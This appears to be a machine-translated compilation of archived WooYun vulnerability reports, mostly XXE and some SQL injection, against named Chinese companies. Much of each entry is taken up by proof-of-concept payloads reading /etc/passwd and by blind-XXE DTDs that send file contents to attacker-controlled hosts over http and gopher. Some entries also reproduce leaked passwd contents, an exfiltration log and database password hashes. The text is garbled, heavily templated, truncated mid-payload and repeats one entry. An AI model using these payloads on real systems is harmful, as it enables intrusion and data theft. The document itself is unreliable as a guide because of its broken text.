
---
### [wooyun-2014-078509] Mogujiehas XXE vulnerability
**Vendor**: Mogujie | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Erge's typical example:https://example.com/[redacted] phone email school and otherinformation,informationif too long, the returned data is ignored.ordinary attempts to view some files do not work,if exploitable, it can access websites and perform dos attacks.

**POC**: the following proves that it can access a website:first deploy a page on your own website:with a small amount of data such as:http://xxxx/xxe.htmconstruct the following xmlentity:<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@some-domain.com</w:t>submit this docxsubmit,it is finally parsed into corresponding data

**Bypass**: Direct exploitation

**Fix**: switch to a safe parser; by the way,is your campus recruiting headcount very small,10not even recruiting 1 people?
---

---
### [wooyun-2013-032647] ZhangyueiReadercheck-in campaign can obtainarbitrarynumber of reading credits(RMB50:1)
**Vendor**: zhangyue.com | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: first obtain your ownmobile phonecheck-in and lottery links,next timeyou can directly use the browser link to check in,lottery.the lottery link looks like this(XXXis a placeholder):https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: if this thing is genuinely tied to money,I think usinghttps+postmight be safer.
---

---
### [wooyun-2014-077146] Tianyi Cloudone locationxxevulnerabilitycan read arbitrary files
**Vendor**: a certain emailservicebusiness support center | **Year**: 2014 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: decompressdocxfile,modifyword/document.xmla certain emailservicefilepreview pagehasthisissue.<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><w:document xmlns:ve="https://example.com/[redacted]" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="https://example.com/[redacted]" xmlns:m="https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: handle parsing
---

---
### [wooyun-2015-0156549] edusohoone locationno login requiredxxearbitrary read
**Vendor**: edusoho.com | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0169109] Renrena subsitehas Blind XXE vulnerability
**Vendor**: Renren | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: can refer toWooYun: Vipshophas Blind XXE vulnerabilityhttps://example.com/[redacted]

**POC**: https://example.com/[redacted] Renrena subsitehasarbitrary file downloadvulnerabilitycorresponds to it

**Bypass**: Direct exploitation

**Fix**: Patch
---

---
### [wooyun-2016-0205725] a certain telecom operatora provincialsystemBlink XXE
**Vendor**: a certain telecom operator | **Year**: 2016 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: test address:http://**.**.**.**/the problem is here:http://**.**.**.**/webservice/services/webservice?wsdl

**POC**: construct:<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>obtain the system directory:the response shows the currently defined file parameter entity was referenced.remote XML:<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:80/%a;'>"> %b; %c;injection:<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTI

**Bypass**: Direct exploitation

**Fix**: disable external XML entity parsing.
---

---
### [wooyun-2014-074048] 139emailXXE vulnerabilitycan read files
**Vendor**: 10086.cn | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: /opes/preview.do improper input handling can usesidretrieve file content<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE ANY [<!ENTITY all SYSTEM "file:///etc/passwd">]>...<string name="sid">&all;</string>...

**POC**: /etc/passwd:sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/no

**Bypass**: Direct exploitation

**Fix**: contact Yozo for the fix
---

---
### [wooyun-2016-0181424] TurboGate mail gateway vulnerability collection
**Vendor**: turbomail.org | **Year**: 2016 | **Type**: improper default configuration

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: improper default configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper default configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: TurboGateis effectivelyTurboMailearly version,TurboGateintegrates many vulnerabilities that appeared inTurboMailinvulnerability.only list hereno login requiredthen canexploitvulnerability,Vendor can refer toTurboMailvulnerabilityperform self-checks.1. http://**.**.**.**/bugs/wooyun-2016-0167905inTurboGateinuseisaxis2<=1.5.1version,has XXE vulnerability,during exploitation, setContent-Typesetasapplication/xml,POSTpacket as follows:POST /services/TM_User.TM_UserHttpSoap11Endpoint/ HTTP/1.0SOAPAction: "urn:getUserOrgList"Content-Type: application/xmlContent-Length: 873Host: **.**.**.**<?xml version

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: refer to the TurboMail fix method
---

---
### [wooyun-2016-0169258] a certain airlineBlind XXE vulnerability
**Vendor**: xiamenair.com | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: for the specific vulnerability principle, refer tohttps://example.com/[redacted]

**POC**: define your ownXMLfile as follows:<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(your own domain)/?xxe_l=%info;'>">%int;%trick;put the code on your ownVPShost.inWVSadd code<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[redacted]">%remote;]>as shown:received response packet:

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0168457] Vipshophas Blind XXE vulnerability
**Vendor**: Vipshop | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: aboutXXE,the vulnerability itself does not have many interesting angles,the more interesting part is:how different languages handleURIdiversity and differentXMLparsers when parsingXMLsome characteristics.for the specific vulnerability principle, refer tohttps://example.com/[redacted] Xfirefile readvulnerabilitythis can only be called an underestimated issue,only for warning and vulnerability verification(quickly internally check all sites usingxfirethe component!!!)

**POC**: xfireispopularwebservicedevelopment component,it ininvokeusesSTAX to parse XML, causingXMLentityinjectionproblematic website:https://example.com/[redacted] % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:port/%a;'>"> %b; %c;save the XML file on the VPS ashttp://ip:port/1.xmlthen construct the following:<?xml version="1.0" encoding

**Bypass**: Direct exploitation

**Fix**: upgradeXFireasApache CXF
---

---
### [wooyun-2015-0135336] a certain securities firm generic file traversal/read(involves many securities companies)
**Vendor**: securities industry | **Year**: 2015 | **Type**: file inclusion

**Meta-thinking**: Trigger signal: functional testing

**Insight**: file inclusion lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify file inclusion-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain securities firmhas XXEcausingdirectories or files can be read; the following are 10 securities-sector cases:http://**.**.**.**/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi>http://**.**.**.**/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi>http://**.**.**.**/ubsiServl

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: FixXXE,if the interface is unused, block it.
---

---
### [wooyun-2016-0169193] 101remoteeducation networka subsitehas Blind XXE vulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityDetailshttp://**.**.**.**/bugs/wooyun-2016-0168457vulnerabilityaddresshttp://**.**.**.**//live800/services/IVerification?wsdl

**POC**: vulnerability screenshot proof

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2016-0169188] E Funda systemhas Blind XXE vulnerability
**Vendor**: a certain fund company | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Patch
---

---
### [wooyun-2015-0135615] wemalla certain Internet companyopen-source PHP mall systemone locationblind xxe(no login required,withPOC)
**Vendor**: www.inuoer.com | **Year**: 2015 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: test versionwemall 3.3downloadaddress https://example.com/[redacted] requires an OSChina account//Application\Lib\Action\Admin\WechatAction.class.php<?phpclass WechatAction extends Action {public function init() {import ( 'wechat', APP_PATH . 'Common', '.class.php' );$config = M ( "Wxconfig" )->where ( array ("id" => "1") )->find ();$options = array ('token' => $config ["token"], // fill in the key you set'enc

**POC**: below is the XXE locationhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: https://example.com/[redacted]
---

---
### [wooyun-2014-065613] a certain Internet companya certain sample code improper function usemay causethird-partyvendors to be affected
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: improper default configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper default configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper default configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: downloaded the latest from the official sitea certain Internet companyopen platform integration sample file(php)https://example.com/[redacted] = $GLOBALS["HTTP_RAW_POST_DATA"];//extract post dataif (!empty($postStr)){$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);$fromUsername = $postObj->FromUserName;$toUsername = $postObj->ToUserName;$keyword = trim($postObj->Content)usedsimplexml_load_stringfunctionto parsep

**POC**: WooYun: PHPYUNlatest versionarbitrary file readvulnerabilityWooYun: PHPYUNlatest versionXML injectionandSQL injectionobtainadministrator account(ignores all defenses)these twophpyunalthough not public but based on the vendor reply it can basically be confirmed asa certain Internet companyapicaused by the issue; alsolatest versiondiscuzx3.2also, the default installation includesa certain Internet companyplugin,but it is not enabled.in other words not initializedTOKEN./source/plugin/wechat/wechat.lib.class.phpline153$postdata = file_get_contents("php://input");if ($postdata) {if (!$this->_checkSignature()) {ret

**Bypass**: filterBypass

**Fix**: use carefullysimplexml_load_stringbefore checking permissions, determine whethertokensample codeshould be written carefully..others use your code with confidence.
---

---
### [wooyun-2016-0169212] Amway Chinahas Blind XXE vulnerability
**Vendor**: amway.com.cn | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: for the specific vulnerability principle, refer tohttps://example.com/[redacted]

**POC**: define your ownXMLfile as follows:<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(your own domain)/?xxe_l=%info;'>">%int;%trick;put the code on your ownVPShost.inWVSadd code<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[redacted]">%remote;]>as shown:received response:[11/Jan

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0109725] ZTOone locationXXE vulnerabilitycan readserver arbitrary files
**Vendor**: ZTO Express | **Year**: 2015 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: found this while decompiling your Zhongtian systemURL http://[IP redacted] xmldata,try it.submitted data:server listener data:[IP redacted] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP redacted] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 HTTP/1.1" 403 4958 "-"

**POC**: found this while decompiling your Zhongtian systemURL http://[IP redacted] xmldata,try it.submitted data:server listener data:[IP redacted] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP redacted] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0169209] Changan Automobilehas Blind XXE vulnerability
**Vendor**: a certain automaker | **Year**: 2016 | **Type**:

**Meta-thinking**: Trigger signal: functional testing

**Insight**:  lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify -related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: similar cases can refer to https://example.com/[redacted]

**POC**: vulnerabilityin:https://example.com/[redacted] % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(your own domain)/?xxe_l=%info;'>">%int;%trick;put the code on your ownVPShost.inWVSadd code<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % rem

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-09351] pull-inarbitrary file traversal/download
**Vendor**: pull-in | **Year**: 2012 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: URL:https://example.com/[redacted] version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1.check the underlying XML parser in use,disable external entity parsing by default;2.update patch:affected versions: [IP redacted].0 RC12.0.0 beta4and earlier versionsfixed versions: [IP redacted].0 RC22.0.0 beta5fix plan:upgrade according to the corresponding version; upgrade link: http://fr
---

---
### [wooyun-2015-0107183] Yonyoua certain siterootpermissionsXXE
**Vendor**: Yonyou Software | **Year**: 2015 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: filter
---

---
### [wooyun-2016-0210560] Sogoua certain sitefile read/list directories(JavaenvironmentBlind XXE)
**Vendor**: Sogou | **Year**: 2016 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] Accesslogverify it.1file content is as follows:<?xml version="1.0" enco

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: .
---

---
### [wooyun-2014-076041] Discuz! xxe can damage the database structure,causingdirty data enters
**Vendor**: Discuz! | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: first look at the file:portalcp_diy.php(lines:301-324):if (submitcheck('importsubmit')) {$isinner = false;$filename = '';if($_POST['importfilename']) {$filename = DISCUZ_ROOT.'./template/default/portal/diyxml/'.$_POST['importfilename'].'.xml';$isinner = true;} else {$upload = new discuz_upload();$upload->init($_FILES['importfile'], 'temp');$attach = $upload->attach;if(!$upload->error()) {$upload->save();}if($upl

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0188574] Vipshopa systemhas remoteXXEread arbitrary filesvulnerability
**Vendor**: Vipshop | **Year**: 2016 | **Type**: application configuration error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: application configuration error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify application configuration error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: refer to Mr. Chen's"Xfirefile readvulnerability"WooYun: Xfirefile readvulnerabilitysystem link:Hanqi mail systemhttp://[IP redacted]

**POC**: evil.dtdcontent:<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xmlfilecontent:<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;

**Bypass**: Direct exploitation

**Fix**: 1.contact the vendor,refer to Mr. Chen's"Xfirefile readvulnerability"WooYun: Xfirefile readvulnerability
---

---
### [wooyun-2014-074215] a certain generic systemSQL injection(involves many enterprises) ##18
**Vendor**: a certain technology company | **Year**: 2014 | **Type**: SQL injectionvulnerability

**Meta-thinking**: Trigger signal: functional testing

**Insight**: SQL injectionvulnerability lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify SQL injectionvulnerability-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Google ora certain search enginesearch:technical support:Changzhou certain Technology Co., Ltd.technical support:a certain technology companyVendorhomepage:https://example.com/[redacted]

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Null
---

---
### [wooyun-2016-0169171] Kingsoft Gameshas Blind XXE vulnerability
**Vendor**: Kingsoft Network | **Year**: 2016 | **Type**: improper system/service operations configuration

**Meta-thinking**: Trigger signal: functional testing

**Insight**: improper system/service operations configuration lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify improper system/service operations configuration-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: for the specific vulnerability principle, refer tohttps://example.com/[redacted]

**POC**: define your ownXMLfile as follows:<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://(your own domain)/?xxe_l=%info1;'>">%int;%trick;put the code on your ownVPShost.add code<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[redacted]">%remote;]>as shown:received response:[11/Ja

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0118639] Enterprise travel service sales platform clientXML injection(leaks sitewide user data)
**Vendor**: rtpnr.com | **Year**: 2015 | **Type**: user sensitive data leakage

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: user sensitive data leakage lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify user sensitive data leakage-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,because the official site has no client download location,so I downloaded it from one user site2,captured packets during login3,Parametersadd a*ran it,14databases4,current database5,B2C_02database, User table

**POC**: this is the full database,the one leaking millions of orders,ran it before - -.

**Bypass**: Direct exploitation

**Fix**: POST /AOIS/YSTA.asmx HTTP/1.1SOAPAction: "https://example.com/[redacted]"Content-Type: text/xml; charset="utf-8"User-Agent: CodeGear SOAP 1.3Host: www.bja
---

---
### [wooyun-2016-0203510] a certain portal siteFocus main siteBlind XXEexploitCloudeye tool test
**Vendor**: a certain portal site | **Year**: 2016 | **Type**: application configuration error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: application configuration error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify application configuration error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain portal siteon the Focus main site,found thisBlind XXE,use the WooYun toolCloudeyetesting foundExecutionthe result took relatively long,indicating it had alreadyExecution,look atcloudeyereceived logs with a response,indicating XXE existsxxeconstructing external entities,triedfilepseudo-protocol,found no returned value...probably disabled,then trieddata,php(base64)all returned nothing, so thought ofxxecan probe ports,then tested the principle:probe localsshport and found the response time was long,indicating it is open.if nothas,it returns in a short time.this kind ofBlind XXEwith related pseudo-protocols disabled is relativelyDT...posting it for discussion~

**POC**: a certain portal siteon the Focus main site,found thisBlind XXE,use the WooYun toolCloudeyetesting foundExecutionthe result took relatively long,indicating it had alreadyExecution,look atcloudeyereceived logs with a response,indicating XXE existsxxeconstructing external entities,triedfilepseudo-protocol,found no returned value...probably disabled,then trieddata,php(base64)all returned nothing, so thought ofxxecan probe ports,then tested the principle:probe localsshport and found the response time was long,indicating it is open.if nothas,it returns in a short time.this kind ofBlind XXEwith related pseudo-protocols disabled is relativelyDT...posting it for discussion~

**Bypass**: Direct exploitation

**Fix**: you know what to do~
---

---
### [wooyun-2016-0188569] Lvmama Travela certain business systemhas XXE vulnerability
**Vendor**: Lvmama Travel | **Year**: 2016 | **Type**: application configuration error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: application configuration error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify application configuration error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: reference link: Xfirefile readvulnerabilityWooYun: Xfirefile readvulnerabilityproblematic link:https://example.com/[redacted]

**POC**: evil.dtdcontent:<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xmlfilecontent:<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;

**Bypass**: Direct exploitation

**Fix**: 1.you can contact the vendor,referenceWooYun: Xfirefile readvulnerabilityfix plan
---

---
### [wooyun-2013-046188] China Network Televisionone locationSQL injectionvulnerability
**Vendor**: China Network Television | **Year**: 2013 | **Type**: SQL injectionvulnerability

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: SQL injectionvulnerability lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify SQL injectionvulnerability-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1)test injection point as follows,the injectable parameter iscolumnid;https://example.com/[redacted] Server: MySQL >=5Current User: 	api@cms24Sql Version: 	5.1.61-logCurrent DB: 	mvsSystem User: 	api@[IP redacted]Host Name: 	cboxup9DB User & Pass: 	root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:localhostapi:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:10.7.

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: filter
---

---
### [wooyun-2015-0113722] a certain securities firmcompany root privilegesXXE vulnerability
**Vendor**: a certain securities firmcompany | **Year**: 2015 | **Type**: arbitrary file traversal/download

**Meta-thinking**: Trigger signal: functional testing

**Insight**: arbitrary file traversal/download lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify arbitrary file traversal/download-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://[IP redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: handle parsing
---

---
### [wooyun-2014-078509] Mogujiehas XXE vulnerability
**Vendor**: Mogujie | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: upload functionality

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Erge's typical example:https://example.com/[redacted] phone email school and otherinformation,informationif too long, the returned data is ignored.ordinary attempts to view some files do not work,if exploitable, it can access websites and perform dos attacks.

**POC**: the following proves that it can access a website:first deploy a page on your own website:with a small amount of data such as:http://xxxx/xxe.htmconstruct the following xmlentity:<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@some-domain.com</w:t>submit this docxsubmit,it is finally parsed into corresponding data

**Bypass**: Direct exploitation

**Fix**: switch to a safe parser; by the way,is your campus recruiting headcount very small,10not even recruiting 1 people?
---
